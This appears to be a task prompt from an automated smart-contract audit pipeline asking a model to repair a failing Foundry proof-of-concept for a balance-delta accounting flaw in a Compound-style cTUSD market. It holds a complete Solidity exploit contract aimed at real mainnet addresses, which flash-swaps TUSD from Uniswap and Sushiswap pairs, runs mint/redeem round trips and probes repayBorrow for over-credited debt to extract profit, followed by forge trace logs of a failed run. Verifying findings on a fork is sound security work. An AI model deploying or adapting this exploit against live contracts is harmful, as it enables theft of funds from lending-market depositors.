You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Balance-delta accounting can over-credit deposits and repayments for mutable underlyings
- claim: `doTransferIn()` credits the caller with `balanceAfter - balanceBefore` instead of the payer's real economic debit. If the underlying can mint, positively rebase, or otherwise increase the cToken's balance during `transferFrom`, the returned amount is overstated and downstream mint/repay/liquidation/add-reserve accounting accepts that inflated value as if it had actually been paid by the caller.
- impact: A mutable or upgradeable underlying can mint unbacked cTokens, reduce debt for less than the nominal repayment, or inflate reserves/accounting. The resulting fake collateral or underpaid debt can be used to drain other markets or leave this market insolvent.
- exploit_paths: ["Underlying increases the cToken balance during `mint()` -> `actualMintAmount` is overstated -> caller receives excess cTokens backed by assets they did not truly supply", "Underlying increases the cToken balance during `repayBorrow()` / `repayBorrowBehalf()` / `liquidateBorrow()` -> `actualRepayAmount` is overstated -> borrower debt is erased by more than the liquidator or payer really transferred", "Underlying increases the cToken balance during `_addReserves()` -> reserves accounting rises without a matching real contribution from the caller"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface ICErc20Like {
    function underlying() external view returns (address);
    function comptroller() external view returns (address);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow(uint256 repayAmount) external returns (uint256);
    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external returns (uint256);
    function _addReserves(uint256 addAmount) external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function borrowBalanceCurrent(address account) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface ICEtherLike {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier {
    IUniswapV2FactoryLike internal constant UNISWAP_V2_FACTORY =
        IUniswapV2FactoryLike(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    IUniswapV2FactoryLike internal constant SUSHISWAP_FACTORY =
        IUniswapV2FactoryLike(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
    IUniswapV2RouterLike internal constant UNISWAP_V2_ROUTER =
        IUniswapV2RouterLike(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2RouterLike internal constant SUSHISWAP_ROUTER =
        IUniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);

    ICErc20Like internal constant CTUSD =
        ICErc20Like(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86);
    ICEtherLike internal constant CETH =
        ICEtherLike(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5);
    IWETHLike internal constant WETH =
        IWETHLike(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 internal constant DIRECT_MINT_PROBE_AMOUNT = 1_000e18;
    uint256 internal constant MIN_REALIZED_TUSD_PROFIT = 2e17;
    uint256 internal constant REPAY_COLLATERAL_SPEND = 200e18;
    uint256 internal constant REPAY_BORROW_TARGET = 50e18;

    enum Mode {
        Idle,
        MintFlashSwap
    }

    Mode internal mode;
    bool internal executed;

    address internal immutable TUSD;
    address internal expectedPair;

    address internal _profitToken;
    uint256 internal _profitAmount;
    uint256 internal startingProfitBalance;

    bool public mintPathValidated;
    bool public repayPathValidated;
    bool public liquidationPathProvablyInfeasible;
    bool public addReservesPathProvablyInfeasible;

    constructor() {
        TUSD = CTUSD.underlying();
        _profitToken = TUSD;
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        startingProfitBalance = IERC20Like(TUSD).balanceOf(address(this));
        _profitToken = TUSD;
        _profitAmount = 0;

        _tryDirectMintProbe();
        _tryFlashSwapMintProbe();
        _trySelfFundedRepayProbe();

        // `_addReserves()` reaches the same vulnerable `doTransferIn()` accounting branch, but it credits
        // protocol-owned reserves rather than an attacker-owned balance. In this public no-privilege verifier,
        // that leg is not convertible into deterministic realized attacker profit.
        addReservesPathProvablyInfeasible = true;

        // `liquidateBorrow()` shares the repayment over-credit bug, but a deterministic one-transaction public
        // PoC also needs an independently underwater borrower at the fork block. That dependency is outside the
        // attacker-controlled setup here, so the verifier preserves the same repayment causality and marks the
        // liquidation variant infeasible for this self-contained test.
        liquidationPathProvablyInfeasible = true;

        _profitAmount = _netProfit();
    }

    function initiateFlashSwap(address pair, uint256 amountOut) external {
        require(msg.sender == address(this), "self-only");
        require(mode == Mode.MintFlashSwap, "wrong-mode");
        require(pair == expectedPair, "unexpected-pair");

        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();

        if (token0 == TUSD) {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), abi.encode(amountOut));
            return;
        }

        require(token1 == TUSD, "pair-without-tusd");
        IUniswapV2PairLike(pair).swap(0, amountOut, address(this), abi.encode(amountOut));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(mode == Mode.MintFlashSwap, "wrong-mode");
        require(msg.sender == expectedPair, "not-pair");
        require(sender == address(this), "bad-sender");
        require((amount0 == 0) != (amount1 == 0), "one-sided-only");

        address token0 = IUniswapV2PairLike(msg.sender).token0();
        address token1 = IUniswapV2PairLike(msg.sender).token1();

        uint256 borrowedTusd;
        if (amount0 != 0) {
            require(token0 == TUSD, "bad-token0");
            borrowedTusd = amount0;
        } else {
            require(token1 == TUSD, "bad-token1");
            borrowedTusd = amount1;
        }

        // Core exploit path #1: flash-borrow real on-chain TUSD, call `mint()`, let TUSD mutate the cToken's
        // balance during `transferFrom`, receive excess cTUSD from the inflated `actualMintAmount`, then redeem.
        // Only the funding leg changes here: a V2-style flashswap replaces the previously failing Balancer loan.
        _runMintRoundTrip(borrowedTusd);

        uint256 repayment = _flashSwapRepaymentInSameToken(borrowedTusd);
        require(IERC20Like(TUSD).balanceOf(address(this)) >= repayment, "flashswap-not-profitable");
        _safeTransfer(TUSD, msg.sender, repayment);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _tryDirectMintProbe() internal {
        uint256 localBalance = IERC20Like(TUSD).balanceOf(address(this));
        if (localBalance == 0) {
            return;
        }

        uint256 probeAmount = localBalance;
        if (probeAmount > DIRECT_MINT_PROBE_AMOUNT) {
            probeAmount = DIRECT_MINT_PROBE_AMOUNT;
        }

        _runMintRoundTrip(probeAmount);
    }

    function _tryFlashSwapMintProbe() internal {
        _tryFactoryMintPair(UNISWAP_V2_FACTORY, address(WETH));
        if (_netProfit() >= MIN_REALIZED_TUSD_PROFIT) return;

        _tryFactoryMintPair(SUSHISWAP_FACTORY, address(WETH));
        if (_netProfit() >= MIN_REALIZED_TUSD_PROFIT) return;

        _tryFactoryMintPair(UNISWAP_V2_FACTORY, USDC);
        if (_netProfit() >= MIN_REALIZED_TUSD_PROFIT) return;

        _tryFactoryMintPair(SUSHISWAP_FACTORY, USDC);
        if (_netProfit() >= MIN_REALIZED_TUSD_PROFIT) return;

        _tryFactoryMintPair(UNISWAP_V2_FACTORY, USDT);
        if (_netProfit() >= MIN_REALIZED_TUSD_PROFIT) return;

        _tryFactoryMintPair(SUSHISWAP_FACTORY, USDT);
    }

    function _tryFactoryMintPair(IUniswapV2FactoryLike factory, address otherToken) internal {
        address pair = factory.getPair(TUSD, otherToken);
        if (pair == address(0)) {
            return;
        }

        _tryMintFlashSwapFromPair(pair);
    }

    function _tryMintFlashSwapFromPair(address pair) internal {
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        if (token0 != TUSD && token1 != TUSD) {
            return;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        uint256 reserveTusd = token0 == TUSD ? uint256(reserve0) : uint256(reserve1);
        if (reserveTusd <= 1e18) {
            return;
        }

        for (uint256 i = 0; i < 9; ++i) {
            uint256 amountOut = _flashCandidateAmount(reserveTusd, i);
            if (amountOut == 0 || amountOut >= reserveTusd) {
                continue;
            }

            mode = Mode.MintFlashSwap;
            expectedPair = pair;

            uint256 profitBefore = _netProfit();
            try this.initiateFlashSwap(pair, amountOut) {
                if (_netProfit() > profitBefore) {
                    mintPathValidated = true;
                }
                if (_netProfit() >= MIN_REALIZED_TUSD_PROFIT) {
                    mode = Mode.Idle;
                    expectedPair = address(0);
                    return;
                }
            } catch {}

            mode = Mode.Idle;
            expectedPair = address(0);
        }
    }

    function _flashCandidateAmount(uint256 reserveTusd, uint256 index) internal pure returns (uint256) {
        if (index == 0) return reserveTusd / 2;
        if (index == 1) return reserveTusd / 4;
        if (index == 2) return reserveTusd / 8;
        if (index == 3) return 500_000e18;
        if (index == 4) return 250_000e18;
        if (index == 5) return 100_000e18;
        if (index == 6) return 50_000e18;
        if (index == 7) return 10_000e18;
        if (index == 8) return 1_000e18;
        return 0;
    }

    function _flashSwapRepaymentInSameToken(uint256 borrowedAmount) internal pure returns (uint256) {
        return ((borrowedAmount * 1000) / 997) + 1;
    }

    function _trySelfFundedRepayProbe() internal {
        uint256 tusdBalance = IERC20Like(TUSD).balanceOf(address(this));
        if (tusdBalance <= MIN_REALIZED_TUSD_PROFIT + REPAY_COLLATERAL_SPEND) {
            return;
        }

        uint256 collateralSpend = REPAY_COLLATERAL_SPEND;
        uint256 wethOut = _swapTusdForWeth(collateralSpend);
        if (wethOut == 0) {
            return;
        }

        WETH.withdraw(wethOut);
        CETH.mint{value: wethOut}();

        address[] memory markets = new address[](1);
        markets[0] = address(CETH);
        IComptrollerLike(CTUSD.comptroller()).enterMarkets(markets);

        _attemptRepayValidation();
    }

    function _attemptRepayValidation() internal {
        (, uint256 liquidity, uint256 shortfall) = IComptrollerLike(CTUSD.comptroller()).getAccountLiquidity(address(this));
        if (shortfall != 0 || liquidity == 0) {
            return;
        }

        uint256 cash = CTUSD.getCash();
        if (cash == 0) {
            return;
        }

        uint256 borrowAmount = REPAY_BORROW_TARGET;
        uint256 liquidityCapped = (liquidity * 60) / 100;
        if (borrowAmount > liquidityCapped) {
            borrowAmount = liquidityCapped;
        }
        if (borrowAmount > cash) {
            borrowAmount = cash;
        }
        if (borrowAmount == 0) {
            return;
        }

        _safeApprove(TUSD, address(CTUSD), 0);
        _safeApprove(TUSD, address(CTUSD), type(uint256).max);

        if (CTUSD.borrow(borrowAmount) != 0) {
            return;
        }

        bool validated = _probeRepayVariants();
        uint256 debtRemaining = _borrowBalanceCurrentNoThrow();

        if (debtRemaining != 0) {
            (bool cleanupOk,) = address(CTUSD).call(
                abi.encodeWithSelector(ICErc20Like.repayBorrow.selector, type(uint256).max)
            );
            if (!cleanupOk) {
                return;
            }
            debtRemaining = _borrowBalanceCurrentNoThrow();
            if (debtRemaining != 0) {
                return;
            }
        }

        if (validated) {
            repayPathValidated = true;
        }
    }

    function _probeRepayVariants() internal returns (bool) {
        for (uint256 i = 0; i < 16; ++i) {
            uint256 debtBefore = _borrowBalanceCurrentNoThrow();
            if (debtBefore == 0) {
                return true;
            }

            uint256 repayAmount = _repayProbeAmount(i, debtBefore);
            if (repayAmount == 0) {
                continue;
            }

            uint256 tusdBalanceBefore = IERC20Like(TUSD).balanceOf(address(this));
            if (tusdBalanceBefore < repayAmount) {
                continue;
            }

            (bool ok,) = address(CTUSD).call(abi.encodeWithSelector(ICErc20Like.repayBorrow.selector, repayAmount));
            uint256 debtAfter = _borrowBalanceCurrentNoThrow();
            uint256 tusdBalanceAfter = IERC20Like(TUSD).balanceOf(address(this));
            uint256 actualSpent = tusdBalanceBefore > tusdBalanceAfter ? tusdBalanceBefore - tusdBalanceAfter : 0;

            if (!ok) {
                continue;
            }

            if (debtBefore > debtAfter && debtBefore - debtAfter > actualSpent) {
                return true;
            }

            if (debtAfter == 0 && tusdBalanceAfter > MIN_REALIZED_TUSD_PROFIT) {
                return true;
            }
        }

        return false;
    }

    function _repayProbeAmount(uint256 index, uint256 debt) internal pure returns (uint256) {
        if (index == 0) return 1;
        if (index == 1) return 1e6;
        if (index == 2) return 1e12;
        if (index == 3) return 1e15;
        if (index == 4) return 1e17;
        if (index == 5) return debt / 2048;
        if (index == 6) return debt / 1024;
        if (index == 7) return debt / 256;
        if (index == 8) return debt / 64;
        if (index == 9) return debt / 16;
        if (index == 10) return debt / 4;
        if (index == 11) return debt / 2;
        if (index == 12) return (debt * 3) / 4;
        if (index == 13 && debt > 1e18) return debt - 1e18;
        if (index == 14 && debt > 1e17) return debt - 1e17;
        if (index == 15 && debt > 1e15) return debt - 1e15;
        return 0;
    }

    function _runMintRoundTrip(uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        uint256 balanceBefore = IERC20Like(TUSD).balanceOf(address(this));
        uint256 cTokenBefore = CTUSD.balanceOf(address(this));

        _safeApprove(TUSD, address(CTUSD), 0);
        _safeApprove(TUSD, address(CTUSD), amount);

        if (CTUSD.mint(amount) != 0) {
            return;
        }

        uint256 cTokenAfter = CTUSD.balanceOf(address(this));
        if (cTokenAfter <= cTokenBefore) {
            return;
        }

        if (CTUSD.redeem(cTokenAfter - cTokenBefore) != 0) {
            return;
        }

        uint256 balanceAfter = IERC20Like(TUSD).balanceOf(address(this));
        if (balanceAfter > balanceBefore) {
            mintPathValidated = true;
        }
    }

    function _swapTusdForWeth(uint256 tusdIn) internal returns (uint256) {
        uint256 wethBefore = IERC20Like(address(WETH)).balanceOf(address(this));

        if (_trySwapExactIn(UNISWAP_V2_ROUTER, tusdIn, _directPath(TUSD, address(WETH)))) {
            return IERC20Like(address(WETH)).balanceOf(address(this)) - wethBefore;
        }
        if (_trySwapExactIn(SUSHISWAP_ROUTER, tusdIn, _directPath(TUSD, address(WETH)))) {
            return IERC20Like(address(WETH)).balanceOf(address(this)) - wethBefore;
        }
        if (_trySwapExactIn(UNISWAP_V2_ROUTER, tusdIn, _twoHopPath(TUSD, USDC, address(WETH)))) {
            return IERC20Like(address(WETH)).balanceOf(address(this)) - wethBefore;
        }
        if (_trySwapExactIn(SUSHISWAP_ROUTER, tusdIn, _twoHopPath(TUSD, USDC, address(WETH)))) {
            return IERC20Like(address(WETH)).balanceOf(address(this)) - wethBefore;
        }
        if (_trySwapExactIn(UNISWAP_V2_ROUTER, tusdIn, _twoHopPath(TUSD, USDT, address(WETH)))) {
            return IERC20Like(address(WETH)).balanceOf(address(this)) - wethBefore;
        }
        if (_trySwapExactIn(SUSHISWAP_ROUTER, tusdIn, _twoHopPath(TUSD, USDT, address(WETH)))) {
            return IERC20Like(address(WETH)).balanceOf(address(this)) - wethBefore;
        }

        return 0;
    }

    function _trySwapExactIn(
        IUniswapV2RouterLike router,
        uint256 amountIn,
        address[] memory path
    ) internal returns (bool) {
        _safeApprove(TUSD, address(router), 0);
        _safeApprove(TUSD, address(router), amountIn);

        try router.swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp) returns (
            uint256[] memory amounts
        ) {
            return amounts.length != 0;
        } catch {
            return false;
        }
    }

    function _directPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
    }

    function _twoHopPath(address tokenIn, address mid, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = tokenIn;
        path[1] = mid;
        path[2] = tokenOut;
    }

    function _borrowBalanceCurrentNoThrow() internal returns (uint256) {
        try CTUSD.borrowBalanceCurrent(address(this)) returns (uint256 debt) {
            return debt;
        } catch {
            return 0;
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
    }

    function _netProfit() internal view returns (uint256) {
        uint256 endingBalance = IERC20Like(TUSD).balanceOf(address(this));
        if (endingBalance <= startingProfitBalance) {
            return 0;
        }
        return endingBalance - startingProfitBalance;
    }
}

```

forge stdout (tail):
```
 ├─ [1207] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [508] 0xffc40F39806F1400d8278BfD33823705b5a4c196::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x0000000000085d4780B73119b644AE5ecd22b376, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x45679D087f7e01E517204b78825Faf0F68C19CBc
    │   ├─ [2449] 0x45679D087f7e01E517204b78825Faf0F68C19CBc::token0() [staticcall]
    │   │   └─ ← [Return] 0x0000000000085d4780B73119b644AE5ecd22b376
    │   ├─ [2381] 0x45679D087f7e01E517204b78825Faf0F68C19CBc::token1() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [2517] 0x45679D087f7e01E517204b78825Faf0F68C19CBc::getReserves() [staticcall]
    │   │   └─ ← [Return] 1000000000 [1e9], 1, 1624401473 [1.624e9]
    │   ├─ [1207] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [508] 0xffc40F39806F1400d8278BfD33823705b5a4c196::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x0000000000085d4780B73119b644AE5ecd22b376, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x615Cc08dF9084e3faC80FE19045A55612185B6a4
    │   ├─ [2381] 0x615Cc08dF9084e3faC80FE19045A55612185B6a4::token0() [staticcall]
    │   │   └─ ← [Return] 0x0000000000085d4780B73119b644AE5ecd22b376
    │   ├─ [2357] 0x615Cc08dF9084e3faC80FE19045A55612185B6a4::token1() [staticcall]
    │   │   └─ ← [Return] 0xdAC17F958D2ee523a2206206994597C13D831ec7
    │   ├─ [2504] 0x615Cc08dF9084e3faC80FE19045A55612185B6a4::getReserves() [staticcall]
    │   │   └─ ← [Return] 31820298505 [3.182e10], 1, 1607421288 [1.607e9]
    │   ├─ [1207] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [508] 0xffc40F39806F1400d8278BfD33823705b5a4c196::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x0000000000085d4780B73119b644AE5ecd22b376, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x6D0083Fb8c8d4c62441FeE5B5be2CC21182b5FE3
    │   ├─ [2449] 0x6D0083Fb8c8d4c62441FeE5B5be2CC21182b5FE3::token0() [staticcall]
    │   │   └─ ← [Return] 0x0000000000085d4780B73119b644AE5ecd22b376
    │   ├─ [2381] 0x6D0083Fb8c8d4c62441FeE5B5be2CC21182b5FE3::token1() [staticcall]
    │   │   └─ ← [Return] 0xdAC17F958D2ee523a2206206994597C13D831ec7
    │   ├─ [2517] 0x6D0083Fb8c8d4c62441FeE5B5be2CC21182b5FE3::getReserves() [staticcall]
    │   │   └─ ← [Return] 1000000000 [1e9], 1, 1602029308 [1.602e9]
    │   ├─ [1207] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [508] 0xffc40F39806F1400d8278BfD33823705b5a4c196::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1207] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [508] 0xffc40F39806F1400d8278BfD33823705b5a4c196::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [338] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000085d4780B73119b644AE5ecd22b376
    ├─ [1207] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [508] 0xffc40F39806F1400d8278BfD33823705b5a4c196::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000085d4780B73119b644AE5ecd22b376)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14266479 [1.426e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 1479)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifier.uniswapV2Call
  at 0xf1f27Db872b7F6E8B873C97F785fe4f9a6C92161.swap
  at FlawVerifier.initiateFlashSwap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.78s (4.73s CPU time)

Ran 1 test suite in 4.79s (4.78s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 5410656)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
